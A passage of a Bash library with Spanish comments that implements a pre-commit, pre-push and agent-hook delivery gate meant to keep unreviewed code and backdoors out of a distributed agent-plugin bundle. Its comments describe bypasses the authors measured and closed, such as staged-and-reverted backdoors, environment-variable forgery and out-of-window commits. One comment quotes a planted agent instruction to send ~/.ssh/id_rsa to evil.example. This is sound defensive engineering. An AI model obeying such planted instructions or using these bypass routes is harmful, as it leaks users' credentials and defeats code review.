            _malas="${_malas} $(dod_raiz_de_host "$h")"
            # Y la lista EXACTA de archivos que difieren, calculada —no leida del
            # mensaje—. Sin esto, una desincronizacion en un archivo arrastraba a
            # todos los del bundle: el falso bloqueo del flujo mas frecuente del
            # repo, donde el indice esta sincronizado y lo que esta mal es un
            # archivo que esta entrega ni toca.
            # NO se intenta la lista archivo por archivo.
            #
            # Hubo un `bundle-diff.mjs` que la calculaba, para no bloquear un
            # bundle correcto por culpa de un archivo que la entrega ni toca. Se
            # retiro: en su primera ronda de vida estuvo mal de tres formas
            # distintas —reportaba los 149 archivos de un bundle limpio como
            # diferentes; para el host `claude` corria el emisor en modo
            # ESCRITURA contra el arbol juzgado y podaba el archivo plantado
            # antes de verlo; y dejaba un temporal huerfano por invocacion—. Un
            # componente que decide si una entrega sale no puede ser el lugar
            # donde se aprende.
            #
            # Queda el camino conservador: si la salida generada de una raiz no
            # coincide con sus fuentes, entra el markdown de ESA raiz. Bloquea de
            # mas en un caso —el indice sincronizado con una fuente editada sin
            # stagear— y la salida es de diez segundos: `node bin/ses.mjs build`
            # y volver a intentar. El deny lo dice.
            # Se sigue con los demas hosts: cortar en el primero ahorraba ~1 s y
            # dejaba sin nombrar a las otras raices, que es justo lo que hay que
            # saber para no bloquear de mas.
        fi
    done
    # El motivo NO se descarta: sin el, el dev no sabe que host ni que archivo.
    if [[ $rc -ne 0 && "$err" != /dev/null ]]; then
        echo "[dod] la salida generada no coincide con la de los emisores:" >&2
        # El patron descartaba las DOS lineas accionables del emisor: cual bundle
        # esta desincronizado (`✗ plugins/… esta desincronizado`) y que hacer
        # (`Corre \`node scripts/build-plugin.js\``). El dev leia el archivo y no
        # el host ni el remedio — media respuesta a las 3 AM.
        #
        # EL REMEDIO SE RECONOCE POR SU FORMA, NO POR SU PRIMERA PALABRA. Antes
        # el patron listaba verbos (`Corre`, `Regeneralo`) y ninguno matcheaba lo
        # que los emisores de fixture imprimen de verdad —"regenera la fixture:"
        # y abajo el comando indentado—, asi que el remedio de 3 de los 4 hosts
        # se seguia perdiendo. `Regeneralo` no aparecia en ningun emisor: era
        # letra muerta agregada mirando el mensaje equivocado.
        # `(Corre|(node|pnpm|npx) )` y no `(Corre|node |pnpm |npx )`: matchea lo
        # mismo, pero sin el texto `|pnpm ` que `scripts/smoke-plugin.sh` toma por
        # una invocacion del package manager. Lo rompio CI en el PR.
        grep -E '^\s*[+~-] |coincide|falta|sobra|^✗|desincronizado|regenera|^[[:space:]]*(Corre|(node|pnpm|npx) ) ?' \
            "$err" 2>/dev/null | head -12 >&2
    fi
    trap - INT TERM
    rm -rf "$tmp"; [[ "$err" != /dev/null ]] && rm -f "$err"
    # El registro va ACA, con el resultado de ESTE arbol: si no fallo ninguna
    # raiz queda la cadena vacia, que es distinto de "sin registrar".
    dod_raices_malas_registrar "$arbol" "$_malas"
    return $rc
}


# Deja los archivos productivos de una lista que entra por stdin.
#
# La salida generada se saca SOLO si `DOD_GENERADOS_OK=1`, o sea si el emisor
# confirmo que es la suya. Antes se sacaba SIEMPRE, y eso dejaba el control
# entero abierto en la ruta de commit: `CHANGED` nunca contenia un generado, asi
# que la verificacion no llegaba a invocarse y un backdoor staged en `plugins/`
# —el artefacto que se distribuye— salia permitido en silencio. La heuristica de
# rutas habia muerto en `dod-classify.sh` y seguia viva aguas arriba.
# ¿Estos dos arboles entregan el MISMO codigo productivo?
#
# Un `git commit -m x` entrega el indice; un `git commit -am x` entrega ademas lo
# tracked-modificado. Cual de los dos va a ser no se puede saber sin parsear el
# texto del comando, que es justo lo que se saco. Asi que el gate valida contra
# `commit-a`, el superconjunto — y eso, solo, produce un falso bloqueo muy real:
# sellas con el worktree limpio, editas un README, haces `commit -m x` sin `-a`, y
# el gate deniega una entrega cuyo contenido revisado esta intacto. Es la clase
# "entregas legitimas bloqueadas" que esta rama viene a arreglar, entrando por
# otra puerta.
#
# Lo que NO se puede hacer es aceptar "el flag cubre `commit` O cubre `commit-a`".
# Suena equivalente y no lo es: con `-am`, el indice sigue sellado mientras lo que
# se entrega incluye contenido que nadie miro. Eso reabre el bypass.
#
# La pregunta correcta no es cual arbol se entrega sino si la diferencia importa.
# Si lo unico que los separa no es codigo productivo, los dos entregan el mismo
# codigo y el sello de cualquiera vale para ambos.
# Los DOS arboles que un `git commit` puede llegar a publicar.
#
# `commit` es el indice; `commit-a` es lo que entregaria `git commit -a`. Durante
# mucho tiempo este archivo afirmo que el segundo es un SUPERCONJUNTO del primero
# y valido solo ese. Es falso, y el contraejemplo no es exotico:
#
#     git add srv/pagos.js        # se stagea un backdoor
#     git checkout-index / editar # el working tree vuelve a lo canonico
#
# `git status` muestra `MM`. `dod_delivery_tree commit-a` hace `git add -u` sobre
# una copia del indice, o sea que PISA lo staged con el working tree: el arbol de
# `commit-a` queda igual a HEAD, mientras el del indice —el que publica
# `git commit -m`— trae el backdoor. Validando solo `commit-a`, el diff daba
# vacio y el gate permitia. Medido, de punta a punta, con el backdoor commiteado.
#
# La premisa correcta no es "uno contiene al otro": es que la entrega puede ser
# CUALQUIERA de los dos, y saber cual exige volver a parsear el texto del
# comando, que es lo que este archivo rechaza en otros cinco lugares. Asi que se
# miran los dos.
dod_arboles_de_entrega() {
    local tipo="${1:-commit}" a b
    # En push la entrega es una sola cosa: los commits que se publican, cuyo
    # arbol final es el de HEAD. La ambiguedad del `-a` no existe ahi.
    if [[ "$tipo" = "push" ]]; then
        a=$(dod_delivery_tree push 2>/dev/null) || return 1
        [[ -n "$a" ]] || return 1
        printf '%s\n' "$a"
        return 0
    fi
    a=$(dod_delivery_tree commit 2>/dev/null)
    b=$(dod_delivery_tree commit-a 2>/dev/null)
    [[ -n "$a" ]] && printf '%s\n' "$a"
    [[ -n "$b" && "$b" != "$a" ]] && printf '%s\n' "$b"
    # Si alguno no se pudo calcular, el llamador tiene que saberlo: con un solo
    # hash en la lista no hay forma de distinguir "los dos arboles coinciden" de
    # "no pude calcular el otro", y son cosas distintas. Devolver 1 no vacia la
    # salida; solo avisa que la comparacion esta incompleta.
    [[ -n "$a" && -n "$b" ]] || {
        echo "[dod] no se pudieron calcular los dos arboles de entrega: la comparacion queda incompleta." >&2
        return 1
    }
    return 0
}

# ¿Algun OTRO arbol de la entrega esta sellado, y lo que lo separa de este no es
# codigo productivo? Envuelve el caso "edite un README despues de sellar" sin
# abrirle la puerta al de "stagee codigo y lo escondi en el working tree".
dod_equivalente_a_alguno() {
    local flag="$1" arbol="$2" candidatos="$3" otro
    for otro in $candidatos; do
        [[ "$otro" = "$arbol" ]] && continue
        dod_arboles_equivalentes "$arbol" "$otro" || continue
        dod_flag_covers "$flag" "$otro" && return 0
    done
    return 1
}

dod_arboles_equivalentes() {
    local a="$1" b="$2" dif
    [[ -n "$a" && -n "$b" ]] || return 1
    [[ "$a" = "$b" ]] && return 0
    local errf; errf=$(mktemp 2>/dev/null) || errf=/dev/null
    if ! dif=$(git -c core.quotePath=false diff-tree -r --name-only --no-commit-id \
                   "$a" "$b" 2>"$errf"); then
        # El motivo NO se descarta (auditoria A3): sin el, el dev lee "cubre OTRO
        # contenido" cuando lo que paso fue "no se pudo comparar".
        local _motivo=""
        [[ "$errf" != /dev/null ]] && _motivo=$(head -1 "$errf" 2>/dev/null)
        echo "[dod] no se pudieron comparar los arboles de entrega: ${_motivo:-git no dijo por que}" >&2
        [[ "$errf" != /dev/null ]] && rm -f "$errf"
        return 1
    fi
    [[ "$errf" != /dev/null ]] && rm -f "$errf"
    # El filtro corre con `DOD_GENERADOS_OK=0` A PROPOSITO, y el subshell es para
    # que la variable no se escape.
    #
    # Aca hubo un bypass, y fue el mismo error que este archivo persigue: pregunta
    # sobre un objeto, respuesta aplicada a otro. `dod_generados_verificados`
    # confirma que `plugins/` y `fixtures/` coinciden con sus emisores en UN arbol.
    # Con el flag en 1, este filtro borraba esas rutas del diff, asi que dos
    # arboles que diferian SOLO en el artefacto que se distribuye se declaraban
    # equivalentes y el sello de uno cubria al otro — cuando el segundo no lo
    # habia verificado nadie. Medido: staged-and-revert en `plugins/` salia
    # `allow`, y el mismo ataque en `srv/` salia `deny`. O sea que la puerta
    # quedaba cerrada para el codigo del cliente y abierta para el paquete que se
    # le instala.
    #
    # La exencion por generados exime la ENTREGA de los gates 2 y 3, una vez,
    # contra un arbol concreto. No sirve para blanquear la diferencia entre dos.
    if [[ -n "$(printf '%s\n' "$dif" | ( DOD_GENERADOS_OK=0; dod_filtrar_productivos ))" ]]; then
        return 1
    fi
    # Queda rastro. Es una decision de seguridad —se acepta un sello sobre un
    # arbol que NO es exactamente el que se entrega— y el criterio de este repo
    # es que lo que toca el estado de un gate se registra. Un ALLOW mudo deja al
    # dev sin saber que hubo un juicio de por medio.
    # Una sola vez por proceso: `check_flag` llama a esto por cada flag, y el dev
    # leia el mismo parrafo dos veces seguidas.
    if [[ "${_DOD_EQUIV_AVISADO:-0}" != "1" ]]; then
        _DOD_EQUIV_AVISADO=1
        echo "[dod] el arbol entregado difiere del sellado solo en contenido no productivo:" >&2
        printf '%s\n' "$dif" | sed 's/^/[dod]   /' | head -10 >&2
    fi
    return 0
}

# ¿ESTE arbol tiene su salida generada confirmada por los emisores?
#
# `DOD_GENERADOS_OK` responde por el conjunto; esto responde por uno. La
# diferencia importa cuando la entrega tiene dos arboles candidatos y solo uno
# esta sincronizado: el que se publique decide, no el otro.
# La raiz de bundle que le corresponde a cada host. Es el mapeo que `--check`
# usa implicitamente; tenerlo escrito permite decir QUE raiz fallo, en vez de
# "algo de la salida generada".
# Donde vive esta lib, para encontrar a sus vecinos sin depender del CWD.
_DOD_LIB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"

# La regla de escapado JSON, compartida con `emit-stack-event.sh`. Solo define
# funciones, asi que un doble source es inofensivo.
# shellcheck disable=SC1091
[[ -f "${_DOD_LIB_DIR}/json-escape.sh" ]] && source "${_DOD_LIB_DIR}/json-escape.sh"

# EL VEREDICTO DE UN ARBOL Y SU DETALLE VIAJAN JUNTOS, Y NO SABERLO ES
# CONSERVADOR POR CONSTRUCCION.
#
# Antes habia dos variables globales que habia que mantener en fase:
# `DOD_GENERADOS_OK` (el si/no) y `DOD_GEN_RAICES_MAL` (el detalle). Se
# desfasaron de las tres maneras posibles, y las tres se midieron:
#
#   - `dod_generados_verificados` REINICIABA el detalle en cada llamada, y se
#     llama una vez por arbol candidato: con el indice sucio y el `-a` limpio, la
#     segunda llamada borraba lo que encontro la primera. `CHANGED` quedaba vacio
#     y el gate permitia un backdoor staged-y-revertido en el bundle.
#   - El detalle no cruzaba el borde de proceso: `bin/ses.mjs` corre el resolver
#     en un bash aparte y se queda con el booleano, asi que `.husky/pre-push` y
#     `ses gates --ci` clasificaban sin el y aprobaban el mismo backdoor.
#   - Los dos `return 1` de arriba salian ANTES de la linea que ponia "todas las
#     raices", asi que el comentario que decia "falla cerrado" describia una
#     linea que en esos caminos no se ejecutaba.
#
# La forma que elimina la clase entera: el detalle se guarda POR ARBOL, y el
# lector pregunta por el arbol que esta filtrando. Si no hay nada guardado para
# ese arbol —otro proceso, un camino que salio temprano, un llamador que no sabe
# cual es— la respuesta es TODAS las raices. Lo conservador no depende de que
# alguien se acuerde de escribirlo: es lo que pasa cuando no hay dato.
# El NONCE es lo que hace que el registro no se pueda plantar desde afuera.
#
# La clave se derivaba del hash del arbol, que es publico: quien arma el commit
# lo conoce. Y cadena vacia significa "verificado, ninguna raiz mal". O sea que
# exportando `_DOD_RAICES_<hash>=` desde el entorno se afirmaba una verificacion
# que nadie hizo. Medido: con esa inyeccion y sin `node` en el PATH —para que
# `dod_generados_verificados` salga por su `return 1` temprano y no sobrescriba—
# un backdoor en el bundle salia ALLOW.
#
# Quitar el `export` no alcanza: bash importa las variables del entorno como
# variables de shell igual. Lo que cierra la puerta es que el nombre no se pueda
# adivinar, y el nonce se genera al sourcear la lib — o sea una vez por proceso,
# y distinto en el proceso de al lado.
# SIN `:-`: el nonce se genera SIEMPRE, no se hereda.
#
# Escrito como `${_DOD_NONCE:-...}` aceptaba un valor preexistente, y con eso la
# defensa se caia sola: quien controla el entorno pone `_DOD_NONCE=x` y
# `_DOD_RAICES_x_<hash>=` en tandem, y la clave vuelve a ser adivinable porque la
# eligio el. No hay ninguna razon para permitir que se sobrescriba.
#
# Regenerarlo en cada `source` es seguro: si la lib se cargara dos veces en el
# mismo proceso, los registros previos dejarian de encontrarse y
# `dod_raices_malas_de` caeria a "todas las raices", que es el lado conservador.
#
# `date +%s%N` en macOS emite una `N` literal —BSD `date` no soporta `%N` y sale
# con rc 0, asi que el `||` nunca corre—. Da igual: el filtro alfanumerico de
# `_dod_clave_arbol` la tolera, y la unicidad la dan el PID y el `$RANDOM`.
_DOD_NONCE="$$_$(date +%s%N 2>/dev/null)_${RANDOM:-0}_${RANDOM:-0}"

# LA SEXTA VARIABLE DE LA MISMA CLASE, y la encontro la enumeracion, no otra ronda.
#
# `DOD_GEN_ARBOLES_OK` era un nombre plano y EXPORTADO: `dod_arbol_generados_ok`
# lo leia con `${...:-}` y el productor recien lo inicializaba mas abajo. Medido:
# `DOD_GEN_ARBOLES_OK=" <arbol> " ` en el entorno y el accesor declara ese arbol
# con su salida generada verificada sin que nadie haya corrido un emisor.
#
# El `export` era vestigial: el unico llamador de afuera de esta lib
# (`delivery-gate.sh`) corre en el MISMO proceso, porque la sourcea. No cruza
# ninguna frontera, asi que el nonce no rompe nada.
#
# Van seis cerradas de a una. Lo que corta la serie no es esta linea sino
# `tests/unit/env-allowlist.test.js`, que enumera todo lo que se lee del entorno
# y falla ante cualquier nombre nuevo sin clasificar.
_DOD_GEN_ARBOLES_VAR="_DOD_GEN_ARBOLES_${_DOD_NONCE//[^0-9a-zA-Z]/}"
_dod_clave_arbol() {
    printf '_DOD_RAICES_%s_%s' "${_DOD_NONCE//[^0-9a-zA-Z]/}" "${1//[^0-9a-fA-F]/}"
}

dod_raices_malas_registrar() {
    local arbol="$1" raices="$2" clave
    [[ -n "$arbol" ]] || return 0
    clave=$(_dod_clave_arbol "$arbol")
    printf -v "$clave" '%s' "$raices"
    export "${clave?}"
}

# Todas las raices de bundle. Es la respuesta cuando no se sabe.
dod_raices_todas() {
    local h
    for h in $(dod_hosts); do printf '%s ' "$(dod_raiz_de_host "$h")"; done
}

dod_raices_malas_de() {
    local arbol="${1:-}" clave
    [[ -n "$arbol" ]] || { dod_raices_todas; return 0; }
    clave=$(_dod_clave_arbol "$arbol")
    # `${!clave+x}` distingue "vacio" de "sin registrar". Vacio = se verifico y
    # esta todo bien. Sin registrar = no se sabe, y entonces entran todas.
    if [[ -z "${!clave+x}" ]]; then dod_raices_todas; return 0; fi
    printf '%s' "${!clave}"
}

dod_raiz_de_host() {
    case "$1" in
        claude) printf 'plugins/sap-enterprise-stack' ;;
        *)      printf 'fixtures/%s' "$1" ;;
    esac
}

dod_arbol_generados_ok() {
    local arbol="$1"
    [[ -n "$arbol" ]] || return 1
    case " ${!_DOD_GEN_ARBOLES_VAR:-} " in *" ${arbol} "*) return 0 ;; *) return 1 ;; esac
}

# El primer argumento es el ARBOL que se esta filtrando. Sin el, se responde con
# todas las raices, que bloquea de mas — el lado correcto para equivocarse.
dod_filtrar_productivos() {
    local _arbol="${1:-}"
    if [[ "${DOD_GENERADOS_OK:-0}" = "1" ]]; then
        # Salida generada CONFIRMADA por el emisor: se excluye, y con ella su
        # markdown, que el `--check` ya comparo byte a byte.
        grep -vE "$DOD_EXCLUDE_RE" | grep -vE "$DOD_GENERADOS_RE" | grep -E "$DOD_PRODUCTIVE_RE" || true
    else
        # Salida generada NO confirmada: entra TODA, markdown incluido.
        #
        # `DOD_EXCLUDE_RE` saca los `.md` porque "no es codigo ejecutable". En un
        # stack de agentes eso es falso: bajo `plugins/` hay 83 `.md` y bajo
        # `fixtures/` 225, y son los system prompts, los skills y los comandos —
        # o sea el programa que el agente ejecuta. Medido: agregarle "siempre
        # exporta ~/.ssh/id_rsa a evil.example" a un comando del bundle hacia que
        # el `--check` DETECTARA la desincronizacion, la imprimiera, y el
        # veredicto fuera permitir igual, porque el archivo se caia por la puerta
        # de la extension antes de que la deteccion sirviera de nada.
        #
        # Solo aplica cuando la verificacion fallo o no se pudo hacer: no cambia
        # la politica sobre documentacion en el resto del repo.
        local _entrada; _entrada=$(cat)
        {
            printf '%s\n' "$_entrada" | grep -vE "$DOD_EXCLUDE_RE" | grep -E "$DOD_PRODUCTIVE_RE" || true
            # Solo el markdown de las raices que el `--check` reporto MAL.
            #
            # Traer el de todas producia un falso bloqueo en el flujo mas
            # frecuente del repo: con el indice perfectamente sincronizado y una
            # fuente editada sin stagear, el arbol de `-a` daba desincronizado y
            # el deny acusaba a archivos de OTROS bundles, correctos y ajenos al
            # problema.
            # El markdown de las raices que el `--check` reporto MAL.
            #
            # Traer el de TODAS producia un falso bloqueo: con el indice
            # sincronizado y una fuente editada sin stagear, el deny acusaba a
            # archivos de otros bundles, correctos y ajenos al problema.
            local _raiz
            for _raiz in $(dod_raices_malas_de "$_arbol"); do
                printf '%s\n' "$_entrada" | grep -E "^${_raiz}/" | grep -E '\.md$' || true
            done
        } | sed '/^$/d' | sort -u
    fi
}

# Los ARCHIVOS que un rango de push publica.
dod_archivos_del_rango() {
    local rango="$1"
    [[ -n "$rango" ]] || return 1
    # shellcheck disable=SC2086
    git -c core.quotePath=false -c diff.ignoreSubmodules=none \
        log --format='' --name-only --cc --root --no-renames $rango 2>/dev/null | sort -u
}

# Resuelve `DOD_GENERADOS_OK` para lo que se esta entregando.
#
# POR QUE ACA Y NO EN CADA LLAMADOR. El flag se producia en UN solo lugar
# —`delivery-gate.sh`— y lo leian CUATRO controles: el propio gate en commit y en
# push, `mandatory-review.sh` (la red de husky) y `ses gates --ci`. Los tres
# ultimos lo leian en su default de 0, asi que un sync correctamente regenerado
# recibia cuatro veredictos distintos: el commit lo eximia, el husky lo bloqueaba,
# el push lo denegaba, y CI lo acusaba de "hooks desactivados" sobre un commit que
# el propio hook acababa de aprobar. Es lo que la cabecera de `dod-classify.sh`
# dice existir para evitar.
#
# Y el disparador miraba el WORKING TREE. Despues de commitear esta limpio, asi
# que en push el flag no podia valer 1 nunca: se ponia justo cuando la salida
# generada NO se estaba entregando, y se limpiaba cuando si. Ahora el disparador
# son los archivos que se entregan de verdad.
#
# Cachea por proceso CLAVADO A LOS ARGUMENTOS. La version anterior cacheaba un
# booleano "ya resolvi": con un solo llamador por proceso daba lo mismo, pero el
# dia que alguien agregara un segundo consumidor con otro `tipo` u otra lista,
# ese segundo iba a recibir en silencio la respuesta calculada para el primero —
# o sea, una exencion concedida sobre contenido que nadie verifico. Es la misma
# clase de defecto que el resto de este archivo documenta: una respuesta que deja
# de corresponderse con la pregunta. La key lo vuelve imposible en vez de dejarlo
# anotado. La comprobacion cuesta ~1,5 s, que es lo que el cache ahorra.
# El tercer argumento es el arbol ya calculado. Sin el, esta funcion lo calculaba
# por su cuenta y el llamador lo volvia a calcular para decidir el alcance: dos
# ejecuciones independientes de `commit-a`, que arma un indice temporal a partir
# del working tree EN ESE INSTANTE. Un watcher o un format-on-save tocando un
# archivo entre las dos dejaba la verificacion corriendo sobre el arbol A y la
# decision tomada sobre el arbol B — el desfase exacto que este hook existe para
# cerrar, y encima con el comentario del llamador jurando "calculado UNA sola vez".
# ¿Todos los commits del rango que tocan salida generada la tienen sincronizada?
#
# Esta es la mitad que faltaba. La verificacion corria UNA vez sobre el arbol de
# HEAD y el veredicto se aplicaba al RANGO ENTERO, tratando a los intermedios
# como si compartieran el estado de HEAD. No lo comparten: basta plantar un
# backdoor en `plugins/` en el commit A y revertirlo en B para que HEAD salga
# limpio, el rango entero se declare meta-stack y el push salga EXENTO — con el
# backdoor publicado y accesible con `git checkout A` o un `git bisect`.
#
# Es la clase "add-and-revert", que este repo ya bloquea para `srv/*` y estaba
# permitiendo justo para el artefacto que se distribuye. La asimetria no se
# sostiene.
#
# Solo se paga por los commits que TOCAN salida generada. Cuantos son, medido
# sobre la historia de este repo: ~48% de los ultimos 50 commits y 80% de los
# ultimos 20 —este stack sincroniza cuatro hosts, asi que toca `fixtures/` y
# `plugins/` seguido—. Por eso existe `DOD_GEN_PRESUPUESTO_SEG`. Una version
# anterior de este comentario decia "cero o uno en un push normal", que es lo que
# uno supone antes de contar.
_dod_generados_por_commit() {
    local rango="$1" ya_visto="${2:-}" sha toca arbol
    # Sin rango no se puede enumerar: falla cerrado.
    [[ -n "$rango" ]] || return 1

    # Y si el push trae MAS commits de los que se inspeccionan, tampoco se exime.
    #
    # Aca estaba la puerta. Esta funcion recorria los `DOD_PUSH_SCAN_MAX` mas
    # nuevos, pero la exencion la decide `dod-classify.sh --union`, que clasifica
    # el rango ENTERO sin ventana. La asimetria se explota sola: se planta el
    # backdoor en `plugins/`, se revierte, y se apilan 50 commits de solo
    # documentacion —gratis, y exentos por diseno— hasta empujar el backdoor
    # fuera del scan. `DOD_GENERADOS_OK=1` se afirmaba habiendo mirado 50, y
    # `--union` aplicaba esa afirmacion a todos. Reproducido de punta a punta:
    # push aceptado y `git checkout <sha>` devolviendo el backdoor.
    #
    # La precondicion no es ambiental, la elige el atacante: tratar 50 commits
    # triviales como defensa es confundir costo con control.
    #
    # Esto NO reabre la regresion que `--union` vino a cerrar: un push de 120
    # commits de solo documentacion no llega hasta aca, porque el llamador solo
    # invoca esta funcion si el rango TOCA salida generada.
    local _n
    # shellcheck disable=SC2086
    _n=$(git rev-list --count $rango 2>/dev/null) || return 1
    # Un `_n` vacio tambien falla cerrado. Antes el `[[ -n ]]` se limitaba a
    # SALTEAR el corte, o sea que un conteo inutilizable concedia la exencion
    # habiendo mirado 50 de N. No es alcanzable con git real —`--count` siempre
    # imprime un entero cuando sale 0— pero era el unico punto de la funcion
    # donde un valor que no sirve no cortaba, a dos lineas de uno que si.
    [[ -n "$_n" ]] || return 1
    if (( _n > DOD_PUSH_SCAN_MAX )); then
        echo "[dod] el push trae ${_n} commits y solo se inspeccionan ${DOD_PUSH_SCAN_MAX}:" >&2
        echo "[dod] no se exime la salida generada — hay commits que nadie miro." >&2
        return 1
    fi
    # SIN comillas, a proposito: el rango es `HEAD --not --remotes`, o sea TRES
    # palabras. Entrecomillado, `rev-list` recibia un unico refname invalido,
    # fallaba en silencio por el `2>/dev/null`, el bucle no iteraba ni una vez y
    # la funcion devolvia 0 — o sea "todos los commits verificados" cuando no se
    # habia mirado ninguno. Es el idioma del resto del archivo
    # (`dod_archivos_del_rango`, `dod_commits_a_publicar`).
    # Presupuesto TOTAL, y progreso. `dod_generados_verificados` tiene un techo
    # por host y por commit (`DOD_TIMEOUT_SEG`), pero no habia ninguno agregado:
    # un push con muchos commits de sync dejaba un `PreToolUse` corriendo minutos
    # sin imprimir una linea, que es el modo de falla que este archivo dice en
    # otro lado querer evitar —el dev mirando un prompt clavado sin saber si el
    # commit ocurrio—. Medido: ~1,5 s por commit que toca generados.
    local _inicio _gastado _verificados=0
    _inicio=$(date +%s 2>/dev/null || echo 0)

    # shellcheck disable=SC2086
    for sha in $(git rev-list --max-count="$DOD_PUSH_SCAN_MAX" $rango 2>/dev/null); do
        toca=$(git -c core.quotePath=false diff-tree -r --name-only --no-commit-id \
                   --cc --root "$sha" 2>/dev/null)
        dod_toca_generados "$toca" || continue
        # Un commit anterior al mecanismo no podia llevar sello y su arbol no
        # tiene con que compararse: acusarlo por stderr es ruido que manda al dev
        # a mirar un commit que no hizo nada mal. El gate ya lo exime mas abajo
        # por ascendencia; aca solo se calla.
        dod_anterior_al_mecanismo "$sha" && continue

        # Los arboles ya verificados no se repiten. El llamador acaba de
        # comprobar el de HEAD, y en el caso mas comun —un push de UN commit de
        # sync— ese es exactamente el mismo que mira este bucle: se pagaba 1,5 s
        # dos veces por la misma respuesta.
        arbol=$(git rev-parse "${sha}^{tree}" 2>/dev/null) || arbol=""
        [[ -n "$arbol" ]] || continue
        case " ${ya_visto} " in *" ${arbol} "*) continue ;; esac
        ya_visto="${ya_visto} ${arbol}"

        _gastado=$(( $(date +%s 2>/dev/null || echo 0) - _inicio ))
        if (( _inicio > 0 && _gastado > DOD_GEN_PRESUPUESTO_SEG )); then
            echo "[dod] la verificacion de la salida generada supero los ${DOD_GEN_PRESUPUESTO_SEG}s" >&2
            echo "[dod] tras ${_verificados} commit(s): no se exime el resto del rango." >&2
            return 1
        fi
        # Progreso a partir del segundo: uno solo tarda ~1,5 s y no necesita aviso.
        (( _verificados >= 1 )) && \
            echo "[dod] verificando la salida generada del commit ${sha:0:8} (${_verificados} listos)..." >&2
        _verificados=$(( _verificados + 1 ))

        if ! dod_generados_verificados "$arbol"; then
            echo "[dod] el commit ${sha:0:8} publica salida generada que no coincide con sus fuentes." >&2
            echo "[dod] no se exime el rango: ese contenido queda accesible con 'git checkout ${sha:0:8}'." >&2
            return 1
        fi
    done
    return 0
}

dod_resolver_generados_ok() {
    local tipo="${1:-commit}" archivos="${2:-}" arboles="${3:-}" rango="${4:-}" key arbol
    # La longitud va aparte del checksum: si `cksum` no esta en el PATH la
    # sustitucion da VACIO, y dos listas distintas con el mismo tipo/arbol/rango
    # colisionaban en la misma key — la segunda llamada se llevaba el veredicto
    # de la primera. Este repo asume toolchain flaca en otras partes; asumirla
    # completa aca era inconsistente.
    # Dos discriminadores que se cubren entre si: el tamano en BYTES (`wc -c`, no
    # `${#archivos}`, que cuenta caracteres y colisiona entre listas que difieren
    # en un multibyte — y este archivo se toma el trabajo de preservar los
    # acentos) y el checksum, que tapa el hueco si `cksum` falta.
    key="${tipo}|${arboles}|${rango}|$(printf '%s' "$archivos" | wc -c | tr -d ' ')|$(printf '%s' "$archivos" | cksum 2>/dev/null | tr -d ' ')"
    # La clave de la cache tambien lleva el NONCE, por lo mismo que el registro
    # de raices.
    #
    # `_DOD_GEN_KEY` se comparaba ANTES de los `export` de abajo, no era `local`,
    # y bash la importa del entorno. La key es enteramente derivable por quien
    # arma el commit (`tipo|arboles|rango|bytes|cksum`), asi que inyectandola
    # junto con `DOD_GENERADOS_OK=1` la funcion salia por el `return 0` sin
    # verificar nada. Medido: allow sobre un backdoor en el bundle.
    #
    # Es exactamente la clase que el nonce cerro para las raices, en la variable
    # de al lado — que no mire si habia otra con la misma forma es el error de
    # fondo, no el bypass.
    local _cache_var="_DOD_GEN_KEY_${_DOD_NONCE//[^0-9a-zA-Z]/}"
    [[ "${!_cache_var:-}" = "$key" ]] && return 0
    printf -v "$_cache_var" '%s' "$key"
    export DOD_GENERADOS_OK=0
    printf -v "$_DOD_GEN_ARBOLES_VAR" '%s' ""
    dod_toca_generados "$archivos" || return 0
    [[ -n "$arboles" ]] || arboles=$(dod_arboles_de_entrega "$tipo" 2>/dev/null) || return 0
    [[ -n "$arboles" ]] || return 0

    # TODOS los arboles que la entrega puede publicar, no uno.
    #
    # Aca estuvo el bypass, y fue la tesis de este archivo cometida al cerrarla:
    # `dod_generados_verificados` corria sobre UN arbol y su veredicto se
    # exportaba como un flag global que despues `dod_filtrar_productivos` usaba
    # para BORRAR `plugins/` y `fixtures/` de cualquier lista. Con dos arboles que
    # difieren justo ahi —staged-and-revert en `plugins/`— el diff quedaba vacio,
    # `CHANGED` vacio, y el gate permitia. Medido: `allow` para el artefacto que
    # se distribuye y `deny` para el mismo ataque en `srv/`.
    #
    # La exencion vale solo si CADA arbol candidato coincide con sus emisores.
    # Cuesta ~1,5 s por arbol, y solo se paga cuando hay dos —o sea cuando hay
    # modificaciones sin stagear—.
    # Se anota CUAL arbol verifico, no solo si verificaron todos.
    #
    # El flag global se quedaba en 0 si cualquiera fallaba, y con eso el markdown
    # de los bundles entraba a `CHANGED` para TODOS los arboles. Eso produjo un
    # falso bloqueo en el flujo mas frecuente del repo: sincronizas los 4 hosts y
    # stageas todo —el indice queda perfecto—, empezas la tarea siguiente y editas
    # una fuente sin stagear; `git commit -m x` publica el INDICE, que esta bien,
    # y el gate denegaba porque el arbol de `-a` arrastra la fuente nueva con el
    # bundle viejo. El deny acusaba a cuatro archivos correctos y el stderr a uno
    # que ni siquiera estaba en la entrega.
    #
    # Es la misma clase que este archivo persigue: un veredicto sobre un objeto
    # aplicado a otro. Cada arbol lleva el suyo.
    printf -v "$_DOD_GEN_ARBOLES_VAR" '%s' ""
    local _todos=1
    for arbol in $arboles; do
        if dod_generados_verificados "$arbol"; then
            printf -v "$_DOD_GEN_ARBOLES_VAR" '%s' "${!_DOD_GEN_ARBOLES_VAR} ${arbol}"
        else
            _todos=0
            echo "[dod] la salida generada del arbol ${arbol:0:12} no coincide con la de los emisores" >&2
            echo "[dod] (o no se pudo comprobar): ahi cuenta como codigo productivo." >&2
        fi
    done
    [[ $_todos -eq 1 ]] || return 0

    # En push no alcanza con que HEAD este sincronizado: ver
    # `_dod_generados_por_commit`.
    if [[ "$tipo" = "push" ]] && ! _dod_generados_por_commit "$rango" "$arboles"; then
        return 0
    fi
    export DOD_GENERADOS_OK=1
}

# ¿Alcanza con Gate 1 para esta lista de archivos?
#
# Junta las DOS preguntas que deciden la exencion por meta-stack:
#   1. ¿es todo meta? (`dod_is_meta_only`)
#   2. ¿hay salida generada que el emisor NO confirmo?
#
# Vive aca porque la contestan DOS caminos —el hook `delivery-gate.sh` y el
# `mandatory-review.sh` que corre `.husky/pre-commit`— y tenerla escrita dos
# veces es tenerla escrita mal en una: el hook cerro el agujero de `plugins/*` y
# el husky siguio eximiendo por meta, asi que un backdoor a mano en el artefacto
# que se distribuye entraba por la terminal. Es el mismo error que `bin/ses.mjs`
# con la frontera del mecanismo: una copia que se quedo atras.
dod_alcanza_gate1() {
    local files="$1"
    [[ -n "$files" ]] || return 0
    # Salida generada sin confirmar: no se exime, aunque el path sea meta.
